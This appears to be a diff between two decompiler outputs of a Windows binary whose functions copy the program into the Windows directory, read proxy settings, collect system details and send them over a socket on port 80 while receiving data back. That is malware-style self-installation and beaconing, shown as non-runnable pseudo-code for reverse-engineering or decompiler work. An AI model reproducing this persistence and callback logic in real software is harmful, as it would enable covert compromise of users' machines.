+        WaitForSingleObject(&dwMilliseconds2->e0, (int32_t)dwMilliseconds);
+        *(int32_t *)(g8 - 4) = 500;
+        Sleep((int32_t)dwMilliseconds2);
+        v7 = &v4;
+        *(int32_t *)(g8 - 4) = 512;
+        *(int32_t *)(g8 - 8) = v7;
+        GetWindowsDirectoryA((char *)dwMilliseconds2, (int32_t)dwMilliseconds);
+        *(int32_t *)(g8 - 4) = (int32_t)&g11;
+        *(int32_t *)(g8 - 8) = (int32_t)&v3;
+        strcpy((char *)dwMilliseconds2, (char *)dwMilliseconds);
+        *(int32_t *)(g8 - 4) = (int32_t)&g12;
+        *(int32_t *)(g8 - 8) = v7;
+        strcat((char *)dwMilliseconds2, (char *)dwMilliseconds);
+        *(int32_t *)(g8 - 4) = (int32_t)&g13;
+        *(int32_t *)(g8 - 8) = v7;
+        strcat((char *)dwMilliseconds2, (char *)dwMilliseconds);
+        *(int32_t *)(g8 - 4) = g5;
+        *(int32_t *)(g8 - 8) = v7;
+        strcat((char *)dwMilliseconds2, (char *)dwMilliseconds);
+        *(int32_t *)(g8 + 28) = g3;
+        *(int32_t *)(g8 + 24) = v7;
+        SetFileAttributesA((char *)dwMilliseconds2, (int32_t)dwMilliseconds);
+        *(int32_t *)(g8 - 4) = v7;
+        DeleteFileA((char *)dwMilliseconds2);
+        *(int32_t *)(g8 - 4) = g3;
+        *(int32_t *)(g8 - 8) = g5;
+        function_4015d4((char *)dwMilliseconds2, (int32_t)dwMilliseconds);
+        *(int32_t *)(g8 + 4) = g7;
+        *(int32_t *)g8 = g3;
+        *(int32_t *)(g8 - 4) = g3;
+        CreateMutexA(dwMilliseconds2, ((int32_t)dwMilliseconds & 1) != 0, (char *)lpName);
+        g5 = *(int32_t *)g8;
+        v6 = g8 + 4;
         // branch -> 0x4017b9
     } else {
         // 0x4016c7
-        CreateMutexA((struct _SECURITY_ATTRIBUTES *)lpMutexAttributes2, (lpMutexAttributes2 & 1) != 0, (char *)g6);
-        lpBuffer2 = (char *)&lpBuffer;
+        CreateMutexA((struct _SECURITY_ATTRIBUTES *)lpMutexAttributes, (lpMutexAttributes & 1) != 0, (char *)g7);
+        lpName = v5;
+        v7 = &v4;
+        v6 = g8;
         // branch -> 0x4017b9
     }
-    int32_t lpFilename = 0; // bp-1540
-    int32_t nameSize = GetModuleFileNameA(&((struct _SECURITY_ATTRIBUTES *)g3)->e0, (char *)&lpFilename, 1024); // 0x4017c6
+    // 0x4017b9
+    *(int32_t *)(v6 - 4) = 1024;
+    *(int32_t *)(v6 - 8) = v2;
+    *(int32_t *)(v6 - 12) = g3;
+    int32_t nSize = (int32_t)lpName; // 0x4017c6
+    int32_t nameSize = GetModuleFileNameA(&dwMilliseconds2->e0, (char *)dwMilliseconds, nSize); // 0x4017c6
     *(char *)(nameSize - 1536 + g2) = (char)g3;
-    GetWindowsDirectoryA(lpBuffer2, 512);
-    strcpy((char *)&str, (char *)&g11);
-    g4 = (int32_t)&g11;
-    CreateDirectoryA(lpBuffer2, (struct _SECURITY_ATTRIBUTES *)g3);
-    strcat(lpBuffer2, (char *)&g12);
-    function_401414((struct _SECURITY_ATTRIBUTES *)&lpBuffer);
-    strcat(lpBuffer2, g13);
-    g6 = (int32_t)&g48;
-    strcat(lpBuffer2, (char *)&g48);
-    if (lstrcmpiA((char *)&lpFilename, lpBuffer2) == 0) {
+    *(int32_t *)(g8 - 4) = 512;
+    *(int32_t *)(g8 - 8) = v7;
+    GetWindowsDirectoryA((char *)dwMilliseconds2, (int32_t)dwMilliseconds);
+    *(int32_t *)(g8 - 4) = (int32_t)&g11;
+    *(int32_t *)(g8 - 8) = (int32_t)&v3;
+    strcpy((char *)dwMilliseconds2, (char *)dwMilliseconds);
+    int32_t * v9 = (int32_t *)(g8 + 4); // 0x4017fd
+    g4 = *v9;
+    *v9 = g3;
+    *(int32_t *)g8 = v7;
+    CreateDirectoryA((char *)dwMilliseconds2, dwMilliseconds);
+    *(int32_t *)(g8 - 4) = (int32_t)&g12;
+    *(int32_t *)(g8 - 8) = v7;
+    strcat((char *)dwMilliseconds2, (char *)dwMilliseconds);
+    *(int32_t *)(g8 - 4) = v7;
+    function_401414();
+    *(int32_t *)(g8 - 4) = (int32_t)&g13;
+    *(int32_t *)(g8 - 8) = v7;
+    strcat((char *)dwMilliseconds2, (char *)dwMilliseconds);
+    *(int32_t *)(g8 - 4) = (int32_t)&g50;
+    *(int32_t *)(g8 - 8) = v7;
+    strcat((char *)dwMilliseconds2, (char *)dwMilliseconds);
+    *(int32_t *)(g8 + 24) = v7;
+    *(int32_t *)(g8 + 20) = v2;
+    if (lstrcmpiA((char *)dwMilliseconds2, (char *)dwMilliseconds) == 0) {
         // 0x4018ab
-        function_4015d4(g6, 1);
-        int32_t result = function_401454(1); // 0x4018b5
-        g6 = v2;
-        g3 = v1;
+        *(int32_t *)(g8 - 4) = 1;
+        *(int32_t *)(g8 - 8) = (int32_t)&g50;
+        function_4015d4((char *)dwMilliseconds2, (int32_t)dwMilliseconds);
+        *(int32_t *)(g8 - 4) = 1;
+        int32_t result = function_401454((int32_t)dwMilliseconds2); // 0x4018b5
+        g7 = *(int32_t *)(g8 + 12);
+        g3 = *(int32_t *)(g8 + 16);
         return result;
     }
     // 0x401861
     function_4030c7();
-    SetFileAttributesA(lpBuffer2, g3);
-    CopyFileA((char *)&lpFilename, lpBuffer2, (g3 & 1) != 0);
-    function_4047d2((struct _FILETIME *)&lpBuffer);
-    function_40511a((struct _STARTUPINFOA *)&lpBuffer);
-    ExitProcess(1);
+    *(int32_t *)(g8 - 4) = g3;
+    *(int32_t *)(g8 - 8) = v7;
+    SetFileAttributesA((char *)dwMilliseconds2, (int32_t)dwMilliseconds);
+    *(int32_t *)(g8 - 4) = g3;
+    *(int32_t *)(g8 - 8) = v7;
+    *(int32_t *)(g8 - 12) = v2;
+    CopyFileA((char *)dwMilliseconds2, (char *)dwMilliseconds, (nSize & 1) != 0);
+    *(int32_t *)(g8 - 4) = v7;
+    function_4047d2();
+    *(int32_t *)(g8 - 4) = v7;
+    function_40511a((char *)dwMilliseconds2);
+    *(int32_t *)(g8 + 4) = 1;
+    ExitProcess((int32_t)dwMilliseconds2);
     // UNREACHABLE
 }
 
-// Address range: 0x4018c1 - 0x4018fe
-int32_t function_4018c1(struct _OSVERSIONINFOA * a1) {
-    int32_t lpVersionInformation = (int32_t)a1; // esi
-    memset(&a1->e0, 0, 156);
-    a1->e0 = 156;
-    if (!GetVersionExA((struct _OSVERSIONINFOA *)lpVersionInformation)) {
+// Address range: 0x4018c1 - 0x4018ff
+int32_t function_4018c1(struct _OSVERSIONINFOA * lpVersionInformation) {
+    int32_t lpVersionInformation2 = (int32_t)lpVersionInformation; // esi
+    memset(&lpVersionInformation->e0, 0, 156);
+    lpVersionInformation->e0 = 156;
+    if (!GetVersionExA(lpVersionInformation)) {
         // 0x4018e7
-        *(int32_t *)lpVersionInformation = 148;
-        GetVersionExA((struct _OSVERSIONINFOA *)lpVersionInformation);
+        *(int32_t *)lpVersionInformation2 = 148;
+        GetVersionExA((struct _OSVERSIONINFOA *)lpVersionInformation2);
         // branch -> 0x4018f0
     }
     int16_t langId = GetSystemDefaultLangID(); // 0x4018f0
-    g60 = langId;
+    g64 = langId;
     return langId;
 }
 
-// Address range: 0x4018ff - 0x4019e1
+// Address range: 0x4018ff - 0x4019e2
 int32_t function_4018ff(void) {
-    int32_t v1 = g5; // 0x40190d
     int32_t phkResult = 0; // bp-8
-    int32_t v2 = 0; // ebx
+    int32_t v1 = 0; // ebx
     int32_t lpcbData = 4; // bp-12
-    int32_t v3 = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, 1, (int32_t **)&phkResult); // 0x401925
-    if (v3 != 0) {
+    int32_t v2 = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, 1, (int32_t **)&phkResult); // 0x401925
+    if (v2 != 0) {
         // 0x4019db
         // branch -> 0x4019dd
         // 0x4019dd
-        g5 = v1;
+        g5 = *(int32_t *)g8;
         return 0;
     }
-    int32_t * lpReserved = (int32_t *)v2;
-    int32_t v4 = RegQueryValueExA((int32_t *)phkResult, "ProxyEnable", lpReserved, lpReserved, (char *)&g59, &lpcbData); // 0x40194c
+    int32_t * lpReserved = (int32_t *)v1; // 0x40194c
+    int32_t v3 = RegQueryValueExA((int32_t *)phkResult, "ProxyEnable", lpReserved, lpReserved, (char *)&g62, &lpcbData); // 0x40194c
     lpcbData = 256;
-    int32_t * lpReserved2 = (int32_t *)v2;
+    int32_t * lpReserved2 = (int32_t *)v1; // 0x40196c
     int32_t lpData; // bp-268
-    int32_t v5 = RegQueryValueExA((int32_t *)phkResult, "ProxyServer", lpReserved2, lpReserved2, (char *)&lpData, &lpcbData); // 0x40196c
-    RegCloseKey((int32_t *)phkResult);
-    if (v4 != v2 || v5 != v2 || (int32_t)g59 == v2) {
+    int32_t v4 = RegQueryValueExA((int32_t *)phkResult, "ProxyServer", lpReserved2, lpReserved2, (char *)&lpData, &lpcbData); // 0x40196c
+    int32_t hKey = phkResult; // 0x40196e
+    int32_t v5 = hKey; // bp-352
+    RegCloseKey((int32_t *)hKey);
+    if (v3 != v1 || v4 != v1 || (int32_t)g62 == v1) {
         // 0x4019db
         // branch -> 0x4019dd
         // 0x4019dd
-        g5 = v1;
+        g5 = *(int32_t *)g8;
         return 0;
     }
     int32_t substr_pos = (int32_t)strstr((char *)&lpData, "http="); // 0x401995
     g4 = (int32_t)"http=";
     int32_t str;
-    if (substr_pos != v2) {
+    if (substr_pos != v1) {
         // 0x4019a3
         str = substr_pos + 5;
         // branch -> 0x4019ae
@@ -1146,189 +1420,248 @@ int32_t function_4018ff(void) {
         str = &lpData;
     }
     char * found_char_pos = strchr((char *)str, 58); // 0x4019b1
-    *found_char_pos = (char)v2;
-    strcpy((char *)&g57, (char *)str);
-    g58 = atoi((char *)((int32_t)found_char_pos + 1));
+    *found_char_pos = (char)v1;
+    strcpy((char *)&g60, (char *)str);
+    g61 = atoi((char *)((int32_t)found_char_pos + 1));
     // branch -> 0x4019dd
     // 0x4019dd
-    g5 = v1;
+    g5 = *(int32_t *)(int32_t)&v5;
     return 1;
 }
 
-// Address range: 0x4019e2 - 0x401baa
-int32_t function_4019e2(struct sockaddr * a1, int32_t protocol, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
+// Address range: 0x4019e2 - 0x401bab
+int32_t function_4019e2(struct timeval * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
     // 0x4019e2
     g1 = 0x2128;
     function_405a10();
-    int32_t v1 = g3; // 0x4019ef
-    int32_t v2 = g6; // 0x4019f0
-    int32_t timeout = v2; // bp-12
-    int32_t v3 = g5; // 0x4019f1
-    int32_t v4 = v3; // bp-16
-    int32_t cp = function_4028cc((char *)a1, v3, v2, v1); // 0x4019f5
-    g4 = (int32_t)(struct timeval *)a1;
+    int32_t v1 = g7; // 0x4019f0
+    int32_t v2 = v1; // bp-12
+    int32_t v3 = &v2; // 0x4019f0
+    int32_t v4 = g5; // 0x4019f1
+    int32_t v5 = v4; // bp-16
+    int32_t v6 = (int32_t)a1;
+    struct timeval * timeout = NULL; // bp-20
+    *(int32_t *)&timeout = v6;
+    int32_t cp = function_4028cc((char *)a1, v4, v1, g3); // 0x4019f5
+    g4 = (int32_t)a1;
+    timeout = (struct timeval *)cp;
     inet_addr((char *)cp);
     g3 = 0;
-    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, protocol); // 0x401a14
-    g6 = sock_fd;
-    int32_t result; // 0x401baa
+    struct fd_set * addr_len = (struct fd_set *)2; // bp-32
+    timeout = (struct timeval *)a2;
+    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x401a14
+    g7 = sock_fd;
+    int32_t v7; // 0x401ba6
+    int32_t result2; // 0x401baa
     if (sock_fd == -1) {
-        result = 0;
+        // 0x401ba4
+        result2 = 0;
         // branch -> 0x401ba6
     } else {
         // 0x401a25
-        v4 = 1;
-        ioctlsocket(sock_fd, -0x7ffb9982, &v4);
-        int32_t v5 = g3; // 0x401a3c
-        timeout = 60;
-        char * writefds = (char *)1; // bp-300
-        if ((int32_t)g59 == v5) {
+        v5 = 1;
+        int16_t v8 = 0x667e; // bp-40
+        int32_t v9 = &v8; // 0x401a30
+        ioctlsocket(sock_fd, 0x667e, &v5);
+        v2 = 60;
+        char * v10 = (char *)1; // bp-300
+        int32_t v11;
+        if ((int32_t)g62 == g3) {
             // 0x401a6e
-            g5 = -0x7ffb9982;
+            g5 = 0;
+            v11 = (int32_t)timeout;
             // branch -> 0x401a74
         } else {
             // 0x401a5e
             g5 = inet_addr((char *)1);
+            v11 = g61;
             // branch -> 0x401a74
         }
         // 0x401a74
-        connect((int32_t)htons(2), (struct sockaddr *)g5, g6);
-        g4 = (int32_t)&writefds;
-        struct fd_set * readfds = (struct fd_set *)g3; // 0x401aa2
-        uint32_t v6 = select(g6 + 1, readfds, (struct fd_set *)&writefds, readfds, (struct timeval *)&timeout); // 0x401aa6
-        if (v6 >= 1) {
+        *(int32_t *)(g8 - 4) = v11;
+        v8 = 2;
+        int16_t sock = htons(2); // 0x401a7b
+        *(int32_t *)(g8 - 4) = 16;
+        *(int32_t *)(g8 - 8) = v9;
+        *(int32_t *)(g8 - 12) = g7;
+        int32_t addr = g5; // 0x401a8c
+        connect((int32_t)sock, (struct sockaddr *)addr, (int32_t)addr_len);
+        *(int32_t *)(g8 - 4) = v3;
+        int32_t v12 = (int32_t)&v10; // 0x401a9c
+        g4 = v12;
+        *(int32_t *)(g8 - 8) = g3;
+        *(int32_t *)(g8 - 12) = v12;
+        *(int32_t *)(g8 - 16) = g3;
+        *(int32_t *)(g8 - 20) = g7 + 1;
+        if (select(addr, addr_len, (struct fd_set *)1, NULL, timeout) >= 1) {
             // 0x401ab0
-            int32_t str; // bp-8492
-            function_40267d((char *)(0x10000 * (int32_t)&str / 0x10000), (int32_t)a1, protocol, a3, a8, a5);
-            int32_t len = strlen((char *)&str); // 0x401ad2
-            memcpy((int32_t *)(len - 0x2128 + g2), (int32_t *)a4, a5);
-            int32_t length = len + a5; // 0x401af2
-            g5 = length;
-            send(g6, (char *)&str, length, g3);
+            *(int32_t *)(g8 - 4) = a5;
+            int32_t v13; // bp-8492
+            int32_t v14 = &v13; // 0x401ab3
+            *(int32_t *)(g8 - 8) = a8;
+            *(int32_t *)(g8 - 12) = a3;
+            *(int32_t *)(g8 - 16) = a2;
+            *(int32_t *)(g8 - 20) = v6;
+            *(int32_t *)(g8 - 24) = v14;
+            char * str = (char *)addr;
+            function_40267d(str, (int32_t)addr_len);
+            *(int32_t *)(g8 - 4) = v14;
+            int32_t len = strlen(str); // eax
+            *(int32_t *)(g8 - 4) = a5;
+            *(int32_t *)(g8 - 8) = a4;
+            *(int32_t *)(g8 - 12) = g2 - 0x2128 + len;
+            memcpy((int32_t *)addr, &addr_len->e0, 1);
+            g5 = len + a5;
+            *(int32_t *)(g8 + 36) = g3;
+            *(int32_t *)(g8 + 32) = g5;
+            *(int32_t *)(g8 + 28) = v14;
+            *(int32_t *)(g8 + 24) = g7;
+            send(addr, (char *)addr_len, 1, 0);
             if (a8 != 1) {
-                int32_t v7 = g6; // 0x401b33
-                int32_t v8 = function_40277e(v7); // 0x401b34
-                g4 = (int32_t)(struct timeval *)v7;
-                if (v8 != -1) {
+                // 0x401b33
+                *(int32_t *)(g8 - 4) = g7;
+                int32_t v15 = function_40277e(); // 0x401b34
+                g4 = *(int32_t *)g8;
+                int32_t v16 = g8 + 4; // 0x401b3c
+                if (v15 != -1) {
                     // 0x401b3f
-                    if (v8 < 0x3e800) {
-                        int32_t v9 = 0; // edi
+                    if (v15 < 0x3e800) {
+                        // 0x401b46
+                        len = 0;
+                        int32_t v17 = v16; // 0x401b4b
                         // branch -> 0x401b48
                         while (true) {
-                            struct fd_set * writefds2 = (struct fd_set *)g3; // 0x401b4c
-                            int32_t v10 = select(g6 + 1, (struct fd_set *)&writefds, writefds2, writefds2, (struct timeval *)&timeout); // 0x401b59
-                            if (v10 < 1) {
+                            // 0x401b48
+                            *(int32_t *)(v17 - 4) = v3;
+                            *(int32_t *)(v17 - 8) = g3;
+                            *(int32_t *)(v17 - 12) = g3;
+                            *(int32_t *)(v17 - 16) = v12;
+                            *(int32_t *)(v17 - 20) = g7 + 1;
+                            if (select(addr, addr_len, (struct fd_set *)1, NULL, timeout) < 1) {
                                 // 0x401b28
-                                closesocket(g6);
-                                result = g3;
+                                *(int32_t *)(g8 - 4) = g7;
+                                closesocket(addr);
+                                int32_t result = g3; // 0x401b2f
                                 // branch -> 0x401ba6
                                 // 0x401ba6
-                                g5 = v4;
-                                g6 = timeout;
-                                g3 = v5;
+                                v7 = g8;
+                                g5 = *(int32_t *)v7;
+                                g7 = *(int32_t *)(v7 + 4);
+                                g3 = *(int32_t *)(v7 + 8);
                                 return result;
                             }
-                            int32_t v11 = v9; // 0x401b69
-                            int32_t v12 = recv(g6, (char *)(v11 + a6), 0x3e800 - v11, g3); // 0x401b73
-                            if (v12 == -1) {
+                            // 0x401b63
+                            *(int32_t *)(g8 - 4) = g3;
+                            *(int32_t *)(g8 - 8) = 0x3e800 - len;
+                            *(int32_t *)(g8 - 12) = len + a6;
+                            *(int32_t *)(g8 - 16) = g7;
+                            int32_t v18 = recv(addr, (char *)addr_len, 1, 0); // 0x401b73
+                            if (v18 == -1) {
                                 // 0x401b9d
-                                closesocket(g6);
+                                // branch -> 0x401b9d
+                                // 0x401b9d
+                                *(int32_t *)(g8 - 4) = g7;
+                                closesocket(addr);
                                 // branch -> 0x401ba4
                                 // 0x401ba4
                                 // branch -> 0x401ba6
                                 // 0x401ba6
-                                g5 = v4;
-                                g6 = timeout;
-                                g3 = v5;
+                                v7 = g8;
+                                g5 = *(int32_t *)v7;
+                                g7 = *(int32_t *)(v7 + 4);
+                                g3 = *(int32_t *)(v7 + 8);
                                 return 0;
                             }
                             // 0x401b7e
-                            if (v12 != g3) {
-                                int32_t v13 = v9 + v12; // 0x401b82
-                                v9 = v13;
-                                if (v13 >= 0x3e800) {
-                                    // break -> 0x401b8c
-                                    break;
+                            if (v18 != g3) {
+                                int32_t v19 = len + v18; // 0x401b82
+                                len = v19;
+                                if (v19 < 0x3e800) {
+                                    // 0x401b82
+                                    v17 = g8;
+                                    // branch -> 0x401b48
+                                    continue;
                                 }
-                                // continue -> 0x401b48
-                                continue;
                             }
                             // 0x401b8c
-                            closesocket(g6);
-                            *(int32_t *)a7 = v9;
+                            *(int32_t *)(g8 - 4) = g7;
+                            closesocket(addr);
+                            *(int32_t *)(g8 - 4) = 1;
+                            *(int32_t *)a7 = len;
                             // branch -> 0x401ba6
                             // 0x401ba6
-                            g5 = v4;
-                            g6 = timeout;
-                            g3 = v5;
-                            return (int32_t)(struct timeval *)1;
+                            v7 = g8;
+                            g5 = *(int32_t *)v7;
+                            g7 = *(int32_t *)(v7 + 4);
+                            g3 = *(int32_t *)(v7 + 8);
+                            return *(int32_t *)g8;
                         }
-                        // 0x401b8c
-                        closesocket(g6);
-                        *(int32_t *)a7 = v9;
-                        // branch -> 0x401ba6
-                        // 0x401ba6
-                        g5 = v4;
-                        g6 = timeout;
-                        g3 = v5;
-                        return (int32_t)(struct timeval *)1;
                     }
                 }
                 // 0x401b9d
-                closesocket(g6);
+                *(int32_t *)(v16 - 4) = g7;
+                closesocket(addr);
                 // branch -> 0x401ba4
                 // 0x401ba4
-                result = 0;
+                result2 = 0;
                 // branch -> 0x401ba6
             } else {
-                struct fd_set * readfds2 = (struct fd_set *)g3; // 0x401b14
-                uint32_t v14 = select(g6 + 1, readfds2, (struct fd_set *)&writefds, readfds2, (struct timeval *)&timeout); // 0x401b1b
-                if (v14 >= 1) {
+                // 0x401b0a
+                *(int32_t *)(g8 - 4) = v3;
+                *(int32_t *)(g8 - 8) = g3;
+                *(int32_t *)(g8 - 12) = v12;
+                *(int32_t *)(g8 - 16) = g3;
+                *(int32_t *)(g8 - 20) = g7 + 1;
+                if (select(addr, addr_len, (struct fd_set *)1, NULL, timeout) >= 1) {
                     // 0x401b25
+                    *(int32_t *)(g8 - 4) = 1;
                     g3 = 1;
                     // branch -> 0x401b28
                 }
                 // 0x401b28
-                closesocket(g6);
-                result = g3;
+                *(int32_t *)(g8 - 4) = g7;
+                closesocket(addr);
+                result2 = g3;
                 // branch -> 0x401ba6
             }
             // 0x401ba6
-            g5 = v4;
-            g6 = timeout;
-            g3 = v5;
-            return result;
+            v7 = g8;
+            g5 = *(int32_t *)v7;
+            g7 = *(int32_t *)(v7 + 4);
+            g3 = *(int32_t *)(v7 + 8);
+            return result2;
         }
         // 0x401b28
-        closesocket(g6);
-        v1 = v5;
-        result = g3;
+        *(int32_t *)(g8 - 4) = g7;
+        closesocket(addr);
+        result2 = g3;
         // branch -> 0x401ba6
     }
     // 0x401ba6
-    g5 = v4;
-    g6 = timeout;
-    g3 = v1;
-    return result;
+    v7 = g8;
+    g5 = *(int32_t *)v7;
+    g7 = *(int32_t *)(v7 + 4);
+    g3 = *(int32_t *)(v7 + 8);
+    return result2;
 }
 
-// Address range: 0x401bab - 0x401c02
+// Address range: 0x401bab - 0x401c03
 int32_t function_401bab(void) {
     int32_t v1 = g4; // bp-4
-    int32_t v2 = g6; // 0x401bac
+    int32_t v2 = g7; // 0x401bac
     int32_t v3 = g5; // 0x401bad
     int32_t * mem = malloc(0x3e800); // 0x401bb3
     int32_t v4 = (int32_t)mem; // 0x401bb3
-    g6 = v4;
+    g7 = v4;
     g5 = 0;
     g4 = 0x3e800;
     int32_t result;
     if (mem != NULL) {
-        int32_t v5 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g47, (int32_t)&g68, 0, v4, (int32_t)&v1, 0); // 0x401bdf
-        int32_t * v6 = (int32_t *)g6;
+        int32_t v5 = function_4019e2((struct timeval *)&g52, 80, (int32_t)&g49, (int32_t)&g74, 0, v4, (int32_t)&v1, 0); // 0x401bdf
+        int32_t * v6 = (int32_t *)g7;
         if (v5 != 0) {
             // 0x401beb
-            g37 = *v6;
+            g39 = (struct _SECURITY_ATTRIBUTES *)*v6;
             g5 = 1;
             // branch -> 0x401bf5
         }
@@ -1343,111 +1676,119 @@ int32_t function_401bab(void) {
     }
     // 0x401bff
     g5 = v3;
-    g6 = v2;
+    g7 = v2;
     return result;
 }
 
-// Address range: 0x401c03 - 0x401dee
+// Address range: 0x401c03 - 0x401def
 int32_t function_401c03(void) {
     struct in_addr in; // 0x401dce
     int32_t v1 = g2; // bp-4
     g2 = &v1;
-    int32_t v2 = g3; // 0x401c0c
-    int32_t v3 = g6; // 0x401c0d
     int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x401c13
-    int32_t (*func)() = GetProcAddress(moduleHandle, "GetTickCount"); // 0x401c21
-    FreeLibrary((int32_t *)(int32_t)moduleHandle);
+    GetProcAddress(moduleHandle, "GetTickCount");
+    int32_t hLibModule = (int32_t)moduleHandle; // 0x401c27
+    int32_t v2 = hLibModule; // bp-1320
+    FreeLibrary((int32_t *)hLibModule);
+    int32_t v3 = 0x3e800; // bp-1324
     int32_t * mem = malloc(0x3e800); // 0x401c35
-    g4 = 0x3e800;
+    g4 = v3;
+    int32_t * v4;
     if (mem == NULL) {
+        v4 = &v2;
         // 0x401deb
-        g6 = v3;
-        g3 = v2;
+        g7 = *v4;
+        g3 = *(int32_t *)((int32_t)v4 + 4);
         g2 = v1;
         return (int32_t)mem;
     }
+    // 0x401c47
+    v3 = g5;
     int32_t str = 0; // bp-1296
-    strcpy((char *)&str, (char *)&g64);
-    int32_t len = strlen((char *)(int32_t)&g64); // 0x401c5b
-    strcpy((char *)(len - 1291 + g2), (char *)&g63);
-    int32_t v4 = strlen((char *)(int32_t)&g63) + 1 + len + 1; // 0x401c7c
-    memcpy((int32_t *)(v4 - 1292 + g2), (int32_t *)&g61, 156);
-    int32_t v5 = 156 + v4; // 0x401c9e
+    strcpy((char *)&str, (char *)&g68);
+    int32_t len = strlen((char *)(int32_t)&g68); // 0x401c5b
+    strcpy((char *)(len - 1291 + g2), (char *)&g67);
+    int32_t v5 = strlen((char *)(int32_t)&g67) + 1 + len + 1; // 0x401c7c
+    memcpy((int32_t *)(v5 - 1292 + g2), &g65, 156);
+    int32_t v6 = 156 + v5; // 0x401c9e
     int32_t str2 = (int32_t)"10.14"; // edi
-    *(int16_t *)(v5 - 1292 + g2) = g60;
-    *(char *)(v5 - 1290 + g2) = (char)(g59 != NULL);
-    int32_t v6 = v5 + 2; // 0x401cc6
-    *(int32_t *)(v6 - 1291 + g2) = (int32_t)g36;
-    int32_t v7 = v6 + 1; // 0x401cce
-    strcpy((char *)(v7 - 1288 + g2), (char *)str2);
-    int32_t len2 = strlen((char *)str2); // 0x401cdf
-    int32_t v8 = len2 + 1 + v7 + 4; // esi
-    __pseudo_call((int32_t)func);
+    *(int16_t *)(v6 - 1292 + g2) = g64;
+    *(char *)(v6 - 1290 + g2) = (char)(g62 != NULL);
+    int32_t v7 = v6 + 2; // 0x401cc6
+    *(int32_t *)(v7 - 1291 + g2) = g38;
+    int32_t v8 = v7 + 1; // 0x401cce
+    strcpy((char *)(v8 - 1288 + g2), (char *)str2);
+    uint32_t len2 = strlen((char *)str2); // 0x401cdf
+    int32_t v9 = len2 + 1 + v8 + 4; // esi
     g4 = 0x36ee80;
-    uint32_t v9 = (int32_t)((int64_t)len2 % 0x36ee80) / 0xea60;
+    uint32_t v10 = len2 % 0x36ee80;
+    g6 = v10;
     int32_t str3 = 0; // bp-272
-    sprintf((char *)&str3, "%u:%u", len2 / 0x36ee80, v9);
-    strcpy((char *)(g2 - 1292 + v8), (char *)&str3);
-    g6 = strlen((char *)&str3) + 1 + v8;
-    strcpy((char *)&str3, (char *)&g47);
+    sprintf((char *)&str3, "%u:%u", len2 / 0x36ee80, v10 / 0xea60);
+    strcpy((char *)(g2 - 1292 + v9), (char *)&str3);
+    g7 = strlen((char *)&str3) + 1 + v9;
+    strcpy((char *)&str3, (char *)&g49);
     char * found_char_pos = strrchr((char *)&str3, 47); // 0x401d5d
-    g5 = (int32_t)&g50;
-    int32_t str4 = g2 - 1292 + g6; // 0x401d68
+    g5 = (int32_t)&g52;
+    int32_t str4 = g2 - 1292 + g7; // 0x401d68
     g3 = str4;
-    strcpy((char *)str4, (char *)&g50);
-    int32_t v10; // 0x401dbf
+    strcpy((char *)str4, (char *)&g52);
+    int32_t v11; // 0x401dbf
     if (found_char_pos == NULL) {
         // 0x401c47
-        v10 = g6;
+        v11 = g7;
         // branch -> 0x401db0
     } else {
         // 0x401d83
         *found_char_pos = 0;
         strcat((char *)g3, (char *)&str3);
         g5 = strlen((char *)g5);
-        int32_t v11 = g6 + strlen((char *)&str3) + 2 + g5; // 0x401dac
-        g6 = v11;
-        v10 = v11;
+        int32_t v12 = g7 + strlen((char *)&str3) + 2 + g5; // 0x401dac
+        g7 = v12;
+        v11 = v12;
         // branch -> 0x401db0
     }
-    int32_t v12 = 0; // bp-16
-    char * v13 = (char *)&v12; // bp-1320
+    int32_t v13 = 0; // bp-16
+    char * v14 = (char *)&v13; // bp-1332
+    struct _SECURITY_ATTRIBUTES * v15 = g39; // 0x401dc8
     in = (struct in_addr){
         .e0 = 0
     };
-    in.e0 = g37;
-    char * v14 = inet_ntoa(in); // 0x401dce
-    int32_t result = function_4019e2((struct sockaddr *)v14, 80, (int32_t)&g68, (int32_t)&str, v10, (int32_t)mem, (int32_t)v13, (int32_t)(char *)1); // 0x401dd5
+    in.e0 = (int32_t)v15;
+    char * v16 = inet_ntoa(in); // 0x401dce
+    int32_t result = function_4019e2((struct timeval *)v16, (int32_t)v15, 80, (int32_t)&g74, (int32_t)&str, (int32_t)(char *)v11, (int32_t)(char *)mem, (int32_t)v14); // 0x401dd5
     free(mem);
-    g5 = (int32_t)(char *)0x401ced;
+    g5 = 1;
+    v4 = &v3;
     // branch -> 0x401deb
     // 0x401deb
-    g6 = v3;
-    g3 = v2;
+    g7 = *v4;
+    g3 = *(int32_t *)((int32_t)v4 + 4);
     g2 = v1;
     return result;
 }
 
-// Address range: 0x401def - 0x401e4b
+// Address range: 0x401def - 0x401e4c
 int32_t function_401def(void) {
     int32_t v1 = g4; // bp-8
-    int32_t v2 = g6; // 0x401df3
+    int32_t v2 = g7; // 0x401df3
     int32_t v3 = g5; // 0x401df4
     int32_t * mem = malloc(0x3e800); // 0x401dfa
     int32_t v4 = (int32_t)mem; // 0x401dfa
-    g6 = v4;
+    g7 = v4;
     g5 = 0;
     g4 = 0x3e800;
     int32_t result;
     if (mem != NULL) {
-        int32_t v5 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g46, (int32_t)&g68, 0, v4, (int32_t)&v1, 0); // 0x401e25
+        int32_t v5 = function_4019e2((struct timeval *)&g52, 80, (int32_t)&g48, (int32_t)&g74, 0, v4, (int32_t)&v1, 0); // 0x401e25
         if (v5 != 0) {
             // 0x401e31
-            g5 = function_401e4c(g6, v1);
+            g5 = function_401e4c(g7, v1);
             // branch -> 0x401e3e
         }
         // 0x401e3e
-        free((int32_t *)g6);
+        free((int32_t *)g7);
+        g4 = g7;
         result = g5;
         // branch -> 0x401e48
     } else {
@@ -1457,305 +1798,400 @@ int32_t function_401def(void) {
     }
     // 0x401e48
     g5 = v3;
-    g6 = v2;
+    g7 = v2;
     return result;
 }
 
-// Address range: 0x401e4c - 0x401e98
-int32_t function_401e4c(int32_t str, int32_t a2) {
+// Address range: 0x401e4c - 0x401e99
